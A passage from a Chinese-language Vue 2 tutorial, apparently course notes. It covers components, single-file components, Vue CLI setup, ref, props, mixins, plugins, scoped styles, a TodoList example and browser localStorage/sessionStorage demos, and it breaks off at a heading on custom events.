		<title>基本使用</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<hello></hello>
			<hr>
			<h1>{{msg}}</h1>
			<hr>
			<!-- 第三步：编写组件标签 -->
			<school></school>
			<hr>
			<!-- 第三步：编写组件标签 -->
			<student></student>
		</div>

		<div id="root2">
			<hello></hello>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		//第一步：创建school组件
		const school = Vue.extend({
			template:`
				<div class="demo">
					<h2>学校名称：{{schoolName}}</h2>
					<h2>学校地址：{{address}}</h2>
					<button @click="showName">点我提示学校名</button>	
				</div>
			`,
			// el:'#root', //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。
			data(){
				return {
					schoolName:'尚硅谷',
					address:'北京昌平'
				}
			},
			methods: {
				showName(){
					alert(this.schoolName)
				}
			},
		})

		//第一步：创建student组件
		const student = Vue.extend({
			template:`
				<div>
					<h2>学生姓名：{{studentName}}</h2>
					<h2>学生年龄：{{age}}</h2>
				</div>
			`,
			data(){
				return {
					studentName:'张三',
					age:18
				}
			}
		})
		
		//第一步：创建hello组件
		const hello = Vue.extend({
			template:`
				<div>	
					<h2>你好啊！{{name}}</h2>
				</div>
			`,
			data(){
				return {
					name:'Tom'
				}
			}
		})
		
		//第二步：全局注册组件
		Vue.component('hello',hello)

		//创建vm
		new Vue({
			el:'#root',
			data:{
				msg:'你好啊！'
			},
			//第二步：注册组件（局部注册）
			components:{
				school,
				student
			}
		})

		new Vue({
			el:'#root2',
		})
	</script>
</html>
```

###  几个注意点

关于组件名

- 一个单词组成
  - 第一种写法(首字母小写)：school
  - 第二种写法(首字母大写)：School

- 多个单词组成
  - 第一种写法(kebab-case命名)：my-school
  - 第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)
  - 备注
    - 组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。
    - 可以使用name配置项指定组件在开发者工具中呈现的名字。

- 关于组件标签
  - 第一种写法：`<school></school>`
  - 第二种写法：`<school/>`
  - 备注：不用使用脚手架时，`<school/>`会导致后续组件不能渲染。

- 一个简写方式：const school = Vue.extend(options) 可简写为：const school = options

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>几个注意点</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>{{msg}}</h1>
			<school></school>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false
		
		//定义组件
		const s = Vue.extend({
			name:'atguigu',
			template:`
				<div>
					<h2>学校名称：{{name}}</h2>	
					<h2>学校地址：{{address}}</h2>	
				</div>
			`,
			data(){
				return {
					name:'尚硅谷',
					address:'北京'
				}
			}
		})

		new Vue({
			el:'#root',
			data:{
				msg:'欢迎学习Vue!'
			},
			components:{
				school:s
			}
		})
	</script>
</html>
```

### 组件的嵌套

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>组件的嵌套</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		//定义student组件
		const student = Vue.extend({
			name:'student',
			template:`
				<div>
					<h2>学生姓名：{{name}}</h2>	
					<h2>学生年龄：{{age}}</h2>	
				</div>
			`,
			data(){
				return {
					name:'尚硅谷',
					age:18
				}
			}
		})
		
		//定义school组件
		const school = Vue.extend({
			name:'school',
			template:`
				<div>
					<h2>学校名称：{{name}}</h2>	
					<h2>学校地址：{{address}}</h2>	
					<student></student>
				</div>
			`,
			data(){
				return {
					name:'尚硅谷',
					address:'北京'
				}
			},
			//注册组件（局部）
			components:{
				student
			}
		})

		//定义hello组件
		const hello = Vue.extend({
			template:`<h1>{{msg}}</h1>`,
			data(){
				return {
					msg:'欢迎来到尚硅谷学习！'
				}
			}
		})
		
		//定义app组件
		const app = Vue.extend({
			template:`
				<div>	
					<hello></hello>
					<school></school>
				</div>
			`,
			components:{
				school,
				hello
			}
		})

		//创建vm
		new Vue({
			template:'<app></app>',
			el:'#root',
			//注册组件（局部）
			components:{app}
		})
	</script>
</html>
```

### VueComponent

- school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。
- 我们只需要写<school/>或<school></school>，Vue解析时会帮我们创建school组件的实例对象，即Vue帮我们执行的：new VueComponent(options)。
- 特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！
- 关于this指向
  - 组件配置中： data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。
  - new Vue(options)配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。

- VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。Vue的实例对象，以后简称vm。

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>VueComponent</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<school></school>
			<hello></hello>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false
		
		//定义school组件
		const school = Vue.extend({
			name:'school',
			template:`
				<div>
					<h2>学校名称：{{name}}</h2>	
					<h2>学校地址：{{address}}</h2>	
					<button @click="showName">点我提示学校名</button>
				</div>
			`,
			data(){
				return {
					name:'尚硅谷',
					address:'北京'
				}
			},
			methods: {
				showName(){
					console.log('showName',this)
				}
			},
		})

		const test = Vue.extend({
			template:`<span>atguigu</span>`
		})

		//定义hello组件
		const hello = Vue.extend({
			template:`
				<div>
					<h2>{{msg}}</h2>
					<test></test>	
				</div>
			`,
			data(){
				return {
					msg:'你好啊！'
				}
			},
			components:{test}
		})


		// console.log('@',school)
		// console.log('#',hello)

		//创建vm
		const vm = new Vue({
			el:'#root',
			components:{school,hello}
		})
	</script>
</html>
```

#### 内置关系

- VueComponent.prototype.__proto__ === Vue.prototype

- 为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。

[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-h4Uw1wmd-1679118224609)(https://ypycdn.nanshuo.icu/posts/vue/image-20230212211638006.png)]

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>一个重要的内置关系</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<school></school>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		Vue.prototype.x = 99

		//定义school组件
		const school = Vue.extend({
			name:'school',
			template:`
				<div>
					<h2>学校名称：{{name}}</h2>	
					<h2>学校地址：{{address}}</h2>	
					<button @click="showX">点我输出x</button>
				</div>
			`,
			data(){
				return {
					name:'尚硅谷',
					address:'北京'
				}
			},
			methods: {
				showX(){
					console.log(this.x)
				}
			},
		})

		//创建一个vm
		const vm = new Vue({
			el:'#root',
			data:{
				msg:'你好'
			},
			components:{school}
		})

		
		//定义一个构造函数
		/* function Demo(){
			this.a = 1
			this.b = 2
		}
		//创建一个Demo的实例对象
		const d = new Demo()

		console.log(Demo.prototype) //显示原型属性

		console.log(d.__proto__) //隐式原型属性

		console.log(Demo.prototype === d.__proto__)

		//程序员通过显示原型属性操作原型对象，追加一个x属性，值为99
		Demo.prototype.x = 99

		console.log('@',d) */

	</script>
</html>
```

## 单文件组件

Vue 的单文件组件（Single-File Component）是一种将组件的 HTML 模板、JavaScript 代码和 CSS 样式放在一个单独的文件中进行组件开发的方式，能够使得组件的可读性和可维护性更加高效。

在单文件组件中，通常使用 `.vue` 文件扩展名，包含三个部分：

1. `<template>` 标签：组件的 HTML 模板。
2. `<script>` 标签：组件的 JavaScript 代码，包括组件的数据、方法、计算属性、生命周期钩子等。
3. `<style>` 标签：组件的 CSS 样式，可以使用普通的 CSS 或者预处理器（如 Sass、Less）来编写。

在下面示例中，单文件组件中包含了一个 `<template>` 标签，用于渲染组件的 HTML 模板，一个 `<script>` 标签，用于定义组件的 JavaScript 代码，以及一个 `<style>` 标签，用于定义组件的 CSS 样式。`<script>` 标签中使用 `export default` 导出一个组件选项对象，包括组件的名称和数据等信息。`<style>` 标签中使用 `scoped` 属性来确保 CSS 样式只在当前组件内生效。

单文件组件使得组件的逻辑更加清晰，便于管理和维护。在 Vue 项目中，使用单文件组件可以有效地提高开发效率，同时也可以通过组件的复用性和可维护性提高项目的可扩展性和可维护性。

例如，下面是一个简单的 Vue 单文件组件：

```js
<template>
  <div>
    <h1>{{ message }}</h1>
  </div>
</template>

<script>
export default {
  name: 'HelloWorld',
  data() {
    return {
      message: 'Hello World!',
    }
  },
}
</script>

<style scoped>
h1 {
  color: red;
}
</style>
```

# Vue的脚手架

> 什么是脚手架

Vue的脚手架是一个用来快速搭建Vue项目的模板工具。它提供了一个可以使用的项目框架，包括目录结构、配置文件、依赖包等。脚手架的目的是让开发者更快速地搭建基础项目架构，而不用从头开始创建目录结构和配置文件，使得开发者可以专注于业务逻辑的开发。Vue最常用的脚手架是Vue CLI，它提供了一个命令行界面，可以快速创建、配置和管理Vue项目。

文档地址: https://cli.vuejs.org/zh/

> 下载搭建脚手架步骤

- 全局安装@vue/cli，指令为**npm install -g @vue/cli**，只执行一次，打开cmd命令行窗口输入即可，若下载网速较慢，可先配置淘宝镜像，命令为：`npm config set registry https://registry.npm.taobao.org`

- 切换到你要创建项目的目录，然后使用命令创建项目：vue create xxxx

- 启动项目：npm run serve，可以在直接在cmd命令行窗口使用该命令，或者使用VSCode打开后在终端运行该代码（推荐使用）

- 备注：
  - 如出现下载缓慢请配置 npm 淘宝镜像：`npm config set registry https://registry.npm.taobao.org`
  - Vue 脚手架隐藏了所有 webpack 相关的配置，若想查看具体的 webpakc 配置并且输出在某个文件中（output.js文件）中展示，请执行：vue inspect > output.j

> Vue脚手架模板项目基本结构

- node_modules：存放着项目中所有依赖的模块和库。这些模块和库可以通过 npm 包管理器安装。Vue 项目的脚手架也可以使用 npm 安装需要的模块，从而在项目中使用这些模块。node_modules 目录中存放着这些依赖的模块和库，以方便在项目中引用。
- public：存放静态资源，例如 favicon.ico 和 index.html。
  - favicon.ico: 页签图标
  - index.html: 主页面

- src：存放源代码，是 Vue 应用的核心部分。
  - assets: 存放静态资源，存放需要经过 webpack 编译的资源，例如图片、字体等。
  - logo.png

- component: 存放Vue组件
  - HelloWorld.vue

- App.vue：汇总所有组件

- main.js：入口文件
- .gitignore：git 版本管制忽略的配置
- babel.config.js：babel 的配置文件
  - Babel是一个JavaScript编译器，可以将高版本的JavaScript代码编译为低版本的代码，以适应不同的浏览器环境。在Vue的脚手架结构中，babel.config.js文件可以用来配置Babel编译JavaScript代码的方式。这样，开发者可以根据自己的需求，使用Babel编译代码，保证应用能够在多种浏览器环境中正常运行。

- package.json：应用包配置文件
- README.md:：应用描述文件
- package-lock.json：包版本控制文件
- vue.config.js：这个文件是一个用于配置Vue脚手架工具的JavaScript文件。它是可选的，但是当您需要为Vue项目进行自定义配置时，它是非常有用的。您可以在这个文件中配置一些额外的选项，如Webpack的配置，构建设置，开发服务器的配置，插件的使用等。这个文件的存在对于在开发环境和生产环境中获得最佳的性能和体验是非常重要的。详情见：https://cli.vuejs.org/zh

[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-WDpamB6l-1679118232368)(null)]

[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-dDBIjhSC-1679118231100)(null)]

[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-GlEBgP7o-1679118232227)(null)]

### 小案例

创建School.vue，Student.vue，App.vue，main.js，index.html文件，这五个文件组成一个简单的单文件组件案例，通过Vue的脚手架（Vue CLI）运行该案例并且展示在页面上，通过命令vue create vue-test，创建一个vue-test目录（就是一个脚手架目录）

![image-20230213104441909](https://ypycdn.nanshuo.icu/posts/vue/image-20230213104441909.png)

- School.vue

```js
<template>
	<div class="demo">
		<h2>学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
		<button @click="showName">点我提示学校名</button>	
	</div>
</template>

<script>
	export default {
    //这里的name的value值不能写成School或school，只能用‘-’来连接，不然会保错,或者驼峰名也行
	name:'my-school',
	data(){
		return {
			name:'尚硅谷',
			address:'北京昌平'
		}
	},
	methods: {
		showName(){
			alert(this.name)
		}
	},
}
</script>

<style>
	.demo{
		background-color: orange;
	}
</style>
```

- Student.vue

```js
<template>
	<div>
		<h2>学生姓名：{{name}}</h2>
		<h2>学生年龄：{{age}}</h2>
	</div>
</template>

<script>
	export default {
    //这里的name的value值不能写成Student或student，只能用‘-’来连接，不然会保错
	name:'my-student',
	data(){
		return {
			name:'张三',
			age:18
		}
	}
}
</script>
```

- App.vue

```js
<template>
	<div>
		<School></School>
		<Student></Student>
	</div>
</template>

<script>
	//引入组件
	import School from './components/School.vue'
	import Student from './components/Student.vue'

	export default {
		name:'App',
		components:{
			School,
			Student
		}
	}
</script>
```

- main.js

`render` 函数在 Vue 中是渲染函数，用于渲染组件的内容。它是一个函数，返回一个 VNode 对象。在 `main.js` 文件中，它通常是用于渲染 Vue 应用的根组件。通常使用 JSX 语法在 `render` 函数中定义根组件，并使用 Vue 的模板语法在其中定义子组件。

简单来说，`render` 函数指定了渲染一个组件的方式，以及该组件的模板是如何组织的。

vue.js与vue.runtime.xxx.js的区别

(1).vue.js是完整版的Vue，包含：核心功能+模板解析器。

(2).vue.runtime.xxx.js是运行版的Vue，只包含：核心功能；没有模板解析器。

因为vue.runtime.xxx.js没有模板解析器，所以不能使用template配置项，需要使用render函数接收到的createElement函数去指定具体内容。

```js
//引入vue，不完整的，精简版(不包含模板解析器），所以在new一个Vue实例时需要通过render函数来定义组件才能正常运行
import Vue from 'vue'
import App from './App.vue'
//关闭vue的生产提示
Vue.config.productionTip = false

//创建vue实例
new Vue({
  render: h => h(App),
}).$mount('#app')
```

- index.html

```js
<!DOCTYPE html>
<html lang="">
  <head>
    <meta charset="utf-8">
      //针对IE浏览器的适配
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
      //网址logo
    <link rel="icon" href="<%= BASE_URL %>favicon.ico">
    <title><%= htmlWebpackPlugin.options.title %></title>
  </head>
  <body>
    <noscript>
      <strong>We're sorry but <%= htmlWebpackPlugin.options.title %> doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
    </noscript>
    <div id="app"></div>
    <!-- built files will be auto injected -->
  </body>
</html>
```

### ref属性

- Vue.js 中的 ref 属性是用于直接访问 Vue 实例或子组件内部的元素或组件实例。这对于在组件外获取或操纵组件内部元素的需求非常有用。

- 使用 ref 的方式非常简单，您可以在元素或组件上设置 ref属性并将其设置为一个字符串。然后，您可以在组件内通过 this.$refs 访问该元素或组件。
- 在下面的代码中，我们在输入框上设置了 ref 属性，并将其设置为 "input"。然后，在提交按钮的点击事件处理函数中，我们可以通过 this.$refs.input 访问该输入框元素，并读取其 value 属性。

```js
<template>
  <div>
    <input ref="input" />
    <button @click="submit">Submit</button>
  </div>
</template>

<script>
export default {
  methods: {
    submit() {
      console.log(this.$refs.input.value);
    },
  },
};
</script>
```

### props配置

Vue.js 中的 props 是一个组件的配置项，用于将数据从父组件传递到子组件。通过 props，父组件可以向子组件传递数据，子组件再将该数据呈现在视图中。

- 功能：让组件接收外部传过来的数据

- 传递数据：```<Demo name="xxx"/>```

- 接收数据

  - 第一种方式（只接收）：```props:['name'] ```

  - 第二种方式（限制类型）：```props:{name:String}```

  - 第三种方式（限制类型、限制必要性、指定默认值）：

    ```js
    props:{
        name:{
        type:String, //类型
        required:true, //必要性
        default:'张三' //默认值
     }
    }
    ```

- 备注：props是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据。

- ChildComponent.vue

在下面的代码中，我们通过 props 配置了一个名为 "message" 的参数，该参数是必需的且为字符串类型。

```js
<template>
  <div>
    <p>{{ message }}</p>
  </div>
</template>

<script>
export default {
  props: {
    message: {
      type: String,
      required: true,
    },
  },
};
</script>
```

- FatherComponent.vue

在父组件中，您可以通过传递一个 message 属性来使用该子组件，并向其传递数据，在下面的代码中，我们在父组件中使用了子组件，并向其传递了一个 "Hello, world!" 的消息。该子组件再将该数据呈现在视图中。

```js
<template>
  <div>
    <child-component message="Hello, world!" />
  </div>
</template>

<script>
import ChildComponent from './ChildComponent.vue';

export default {
  components: {
    ChildComponent,
  },
};
</script>
```

### mixin混入(合)

Vue的mixin是一个可复用的代码块，可以包含组件的数据、生命周期钩子、方法和计算属性等。它可以被一个或多个组件使用，以达到复用代码的目的。在实际使用中，你可以将相似的代码放入一个 mixin 中，然后将这个 mixin 混入多个组件中。这样可以大大简化代码，同时也使代码变得更易维护。

全局混入：Vue.mixin(xxx)

局部混入：mixins:['xxx']

- mixins.js

```js
export const mixins = {
	methods: {
		showName(){
			alert(this.name)
		}
	},
	mounted() {
		console.log('你好啊！')
	},
}
```

### 插件

Vue.js 的插件是一种扩展 Vue 的功能的方法。插件可以是实现一些自定义功能的组件、指令、过滤器、混入以及其他东西。

在 Vue 中安装插件的方法如下

```js
import MyPlugin from './my-plugin.js'

Vue.use(MyPlugin)
```

上面的代码将导入一个名为 MyPlugin 的插件，然后调用 Vue.use() 方法将其安装到 Vue 中。

插件必须暴露一个 install 方法，该方法将被 Vue 调用，并传递一个 Vue 构造函数作为参数。插件的 install 方法通常实现以下操作：

- 定义一个全局组件、指令、过滤器或混入。
- 添加一个全局 API。
- 定义一个 Vue 原型属性。

下面是一个简单的插件示例，下面的代码定义了一个名为 MyPlugin 的插件，该插件通过定义一个 Vue 原型方法 $myMethod() 来添加一个全局 API。安装完插件后，你就可以在任意 Vue 组件中使用 $myMethod() 方法了。

```js
const MyPlugin = {
  install (Vue, options) {
    Vue.prototype.$myMethod = function (methodOptions) {
      // 实现自己的业务逻辑...
    }
  }
}

export default MyPlugin
```

### scoped样式

Vue的scoped是一种特殊的 CSS 的作用域限制，用于防止样式冲突，以确保组件的样式不会影响其他组件。在组件中使用 scoped 属性后，该组件内的样式将仅影响该组件内的元素，不会影响到整个页面的其他元素。

这样的话，我们在构建多个组件时，不需要担心样式会相互影响，从而使代码更加清晰、可维护。

使用 scoped 属性的语法如下：

```js
<template>
  <div>
    <!-- 这里的样式只会影响到当前组件内的元素 -->
    <style scoped>
      /* 这里是样式代码 */
    </style>
  </div>
</template>
```

### Todo

Vue 的 Todo 应用是一种经典的任务管理应用，用于练习和理解 Vue 的基本功能，包括数据绑定、事件处理、条件渲染、循环渲染等。

在 Todo 应用中，用户可以通过输入框输入任务项，并在列表中显示。同时，用户也可以通过复选框标记已完成的任务，或者删除不需要的任务。

组件化编码流程

(1).拆分静态组件：组件要按照功能点拆分，命名不要与html元素冲突。

(2).实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用：

- 一个组件在用：放在组件自身即可。
- 一些组件在用：放在他们共同的父组件上（<span style="color:red">状态提升</span>）。

(3).实现交互：从绑定事件开始

props适用于

- 父组件 ==> 子组件 通信
- 子组件 ==> 父组件 通信（要求父先给子一个函数）

使用v-model时要切记：v-model绑定的值不能是props传过来的值，因为props是不可以修改的！

props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做。

TodoList案例（1.0版本）

- MyFooter.vue

```js
<template>
	<div class="todo-footer" v-show="total">
		<label>
			<!-- <input type="checkbox" :checked="isAll" @change="checkAll"/> -->
			<input type="checkbox" v-model="isAll"/>
		</label>
		<span>
			<span>已完成{{doneTotal}}</span> / 全部{{total}}
		</span>
		<button class="btn btn-danger" @click="clearAll">清除已完成任务</button>
	</div>
</template>

<script>
	export default {
		name:'MyFooter',
		props:['todos','checkAllTodo','clearAllTodo'],
		computed: {
			//总数
			total(){
				return this.todos.length
			},
			//已完成数
			doneTotal(){
				//此处使用reduce方法做条件统计
				/* const x = this.todos.reduce((pre,current)=>{
					console.log('@',pre,current)
					return pre + (current.done ? 1 : 0)
				},0) */
				//简写
				return this.todos.reduce((pre,todo)=> pre + (todo.done ? 1 : 0) ,0)
			},
			//控制全选框
			isAll:{
				//全选框是否勾选
				get(){
					return this.doneTotal === this.total && this.total > 0
				},
				//isAll被修改时set被调用
				set(value){
					this.checkAllTodo(value)
				}
			}
		},
		methods: {
			/* checkAll(e){
				this.checkAllTodo(e.target.checked)
			} */
			//清空所有已完成
			clearAll(){
				this.clearAllTodo()
			}
		},
	}
</script>

<style scoped>
	/*footer*/
	.todo-footer {
		height: 40px;
		line-height: 40px;
		padding-left: 6px;
		margin-top: 5px;
	}

	.todo-footer label {
		display: inline-block;
		margin-right: 20px;
		cursor: pointer;
	}

	.todo-footer label input {
		position: relative;
		top: -1px;
		vertical-align: middle;
		margin-right: 5px;
	}

	.todo-footer button {
		float: right;
		margin-top: 5px;
	}
</style>
```

- MyHeader.vue

```js
<template>
	<div class="todo-header">
		<input type="text" placeholder="请输入你的任务名称，按回车键确认" v-model="title" @keyup.enter="add"/>
	</div>
</template>

<script>
    //npm i nanoid命令下载nanoid库
	import {nanoid} from 'nanoid'
	export default {
		name:'MyHeader',
		//接收从App传递过来的addTodo
		props:['addTodo'],
		data() {
			return {
				//收集用户输入的title
				title:''
			}
		},
		methods: {
			add(){
				//校验数据
				if(!this.title.trim()) return alert('输入不能为空')
				//将用户的输入包装成一个todo对象
				const todoObj = {id:nanoid(),title:this.title,done:false}
				//通知App组件去添加一个todo对象
				this.addTodo(todoObj)
				//清空输入
				this.title = ''
			}
		},
	}
</script>

<style scoped>
	/*header*/
	.todo-header input {
		width: 560px;
		height: 28px;
		font-size: 14px;
		border: 1px solid #ccc;
		border-radius: 4px;
		padding: 4px 7px;
	}

	.todo-header input:focus {
		outline: none;
		border-color: rgba(82, 168, 236, 0.8);
		box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(82, 168, 236, 0.6);
	}
</style>
```

- MyIteam.vue

```js
<template>
	<li>
		<label>
			<input type="checkbox" :checked="todo.done" @change="handleCheck(todo.id)"/>
			<!-- 如下代码也能实现功能，但是不太推荐，因为有点违反原则，因为修改了props -->
			<!-- <input type="checkbox" v-model="todo.done"/> -->
			<span>{{todo.title}}</span>
		</label>
		<button class="btn btn-danger" @click="handleDelete(todo.id)">删除</button>
	</li>
</template>

<script>
	export default {
		name:'MyItem',
		//声明接收todo、checkTodo、deleteTodo
		props:['todo','checkTodo','deleteTodo'],
		methods: {
			//勾选or取消勾选
			handleCheck(id){
				//通知App组件将对应的todo对象的done值取反
				this.checkTodo(id)
			},
			//删除
			handleDelete(id){
				if(confirm('确定删除吗？')){
					//通知App组件将对应的todo对象删除
					this.deleteTodo(id)
				}
			}
		},
	}
</script>

<style scoped>
	/*item*/
	li {
		list-style: none;
		height: 36px;
		line-height: 36px;
		padding: 0 5px;
		border-bottom: 1px solid #ddd;
	}

	li label {
		float: left;
		cursor: pointer;
	}

	li label li input {
		vertical-align: middle;
		margin-right: 6px;
		position: relative;
		top: -1px;
	}

	li button {
		float: right;
		display: none;
		margin-top: 3px;
	}

	li:before {
		content: initial;
	}

	li:last-child {
		border-bottom: none;
	}

	li:hover{
		background-color: #ddd;
	}
	
	li:hover button{
		display: block;
	}
</style>
```

- MyList.vue

```js
<template>
	<ul class="todo-main">
		<MyItem 
			v-for="todoObj in todos"
			:key="todoObj.id" 
			:todo="todoObj" 
			:checkTodo="checkTodo"
			:deleteTodo="deleteTodo"
		/>
	</ul>
</template>

<script>
	import MyItem from './MyItem'

	export default {
		name:'MyList',
		components:{MyItem},
		//声明接收App传递过来的数据，其中todos是自己用的，checkTodo和deleteTodo是给子组件MyItem用的
		props:['todos','checkTodo','deleteTodo']
	}
</script>

<style scoped>
	/*main*/
	.todo-main {
		margin-left: 0px;
		border: 1px solid #ddd;
		border-radius: 2px;
		padding: 0px;
	}

	.todo-empty {
		height: 40px;
		line-height: 40px;
		border: 1px solid #ddd;
		border-radius: 2px;
		padding-left: 5px;
		margin-top: 10px;
	}
</style>
```

- App.vue

```js
<template>
	<div id="root">
		<div class="todo-container">
			<div class="todo-wrap">
				<MyHeader :addTodo="addTodo"/>
				<MyList :todos="todos" :checkTodo="checkTodo" :deleteTodo="deleteTodo"/>
				<MyFooter :todos="todos" :checkAllTodo="checkAllTodo" :clearAllTodo="clearAllTodo"/>
			</div>
		</div>
	</div>
</template>

<script>
	import MyHeader from './components/MyHeader'
	import MyList from './components/MyList'
	import MyFooter from './components/MyFooter.vue'

	export default {
		name:'App',
		components:{MyHeader,MyList,MyFooter},
		data() {
			return {
				//由于todos是MyHeader组件和MyFooter组件都在使用，所以放在App中（状态提升）
				todos:[
					{id:'001',title:'抽烟',done:true},
					{id:'002',title:'喝酒',done:false},
					{id:'003',title:'开车',done:true}
				]
			}
		},
		methods: {
			//添加一个todo
			addTodo(todoObj){
				this.todos.unshift(todoObj)
			},
			//勾选or取消勾选一个todo
			checkTodo(id){
				this.todos.forEach((todo)=>{
					if(todo.id === id) todo.done = !todo.done
				})
			},
			//删除一个todo
			deleteTodo(id){
				this.todos = this.todos.filter( todo => todo.id !== id )
			},
			//全选or取消全选
			checkAllTodo(done){
				this.todos.forEach((todo)=>{
					todo.done = done
				})
			},
			//清除所有已经完成的todo
			clearAllTodo(){
				this.todos = this.todos.filter((todo)=>{
					return !todo.done
				})
			}
		}
	}
</script>

<style>
	/*base*/
	body {
		background: #fff;
	}
	.btn {
		display: inline-block;
		padding: 4px 12px;
		margin-bottom: 0;
		font-size: 14px;
		line-height: 20px;
		text-align: center;
		vertical-align: middle;
		cursor: pointer;
		box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
		border-radius: 4px;
	}
	.btn-danger {
		color: #fff;
		background-color: #da4f49;
		border: 1px solid #bd362f;
	}
	.btn-danger:hover {
		color: #fff;
		background-color: #bd362f;
	}
	.btn:focus {
		outline: none;
	}
	.todo-container {
		width: 600px;
		margin: 0 auto;
	}
	.todo-container .todo-wrap {
		padding: 10px;
		border: 1px solid #ddd;
		border-radius: 5px;
	}
</style>
```

- main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//关闭Vue的生产提示
Vue.config.productionTip = false

//创建vm
new Vue({
	el:'#app',
	render: h => h(App)
})
```

### 浏览器本地存储

存储内容大小一般支持5MB左右（不同浏览器可能还不一样）

- localStorage和SessionStorage

localStorage是浏览器 Web Storage API 的一部分，是一种用于在浏览器端存储数据的机制。它与sessionStorage非常类似，但是数据在浏览器关闭后也不会被清除，而`sessionStorage`的数据随着浏览器关闭而清除。

你可以使用localStorage来存储用户的配置、历史记录等信息。localStorage有两个重要的方法：setItem和getItem。通过使用它们，你可以在浏览器端存储和获取数据。SessionStorage使用方法类似于localStorage，也是使用sessionStorage对象的setItem()和getItem()方法来存储和读取数据：

- 相关API
  - xxxxxStorage.setItem('key', 'value')，该方法接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值。
  - xxxxxStorage.getItem('person')，该方法接受一个键名作为参数，返回键名对应的值。
  - xxxxxStorage.removeItem('key')，该方法接受一个键名作为参数，并把该键名从存储中删除。
  - xxxxxStorage.clear()，该方法会清空存储中的所有数据。

- 备注
- SessionStorage存储的内容会随着浏览器窗口关闭而消失
- LocalStorage存储的内容，需要手动清除才会消失
- xxxxxStorage.getItem(xxx)，如果xxx对应的value获取不到，那么getItem的返回值是null
- JSON.parse(null)，的结果依然是null

- localStorage.html

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>localStorage</title>
	</head>
	<body>
		<h2>localStorage</h2>
		<button onclick="saveData()">点我保存一个数据</button>
		<button onclick="readData()">点我读取一个数据</button>
		<button onclick="deleteData()">点我删除一个数据</button>
		<button onclick="deleteAllData()">点我清空一个数据</button>

		<script type="text/javascript" >
			let p = {name:'张三',age:18}

			function saveData(){
				localStorage.setItem('msg','hello!!!')
				localStorage.setItem('msg2',666)
				localStorage.setItem('person',JSON.stringify(p))
			}
			function readData(){
				console.log(localStorage.getItem('msg'))
				console.log(localStorage.getItem('msg2'))

				const result = localStorage.getItem('person')
				console.log(JSON.parse(result))

				// console.log(localStorage.getItem('msg3'))
			}
			function deleteData(){
				localStorage.removeItem('msg2')
			}
			function deleteAllData(){
				localStorage.clear()
			}
		</script>
	</body>
</html>
```

- SessionStorage.html

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>sessionStorage</title>
	</head>
	<body>
		<h2>sessionStorage</h2>
		<button onclick="saveData()">点我保存一个数据</button>
		<button onclick="readData()">点我读取一个数据</button>
		<button onclick="deleteData()">点我删除一个数据</button>
		<button onclick="deleteAllData()">点我清空一个数据</button>

		<script type="text/javascript" >
			let p = {name:'张三',age:18}

			function saveData(){
				sessionStorage.setItem('msg','hello!!!')
				sessionStorage.setItem('msg2',666)
				sessionStorage.setItem('person',JSON.stringify(p))
			}
			function readData(){
				console.log(sessionStorage.getItem('msg'))
				console.log(sessionStorage.getItem('msg2'))

				const result = sessionStorage.getItem('person')
				console.log(JSON.parse(result))

				// console.log(sessionStorage.getItem('msg3'))
			}
			function deleteData(){
				sessionStorage.removeItem('msg2')
			}
			function deleteAllData(){
				sessionStorage.clear()
			}
		</script>
	</body>
</html>
```

### 自定义事件

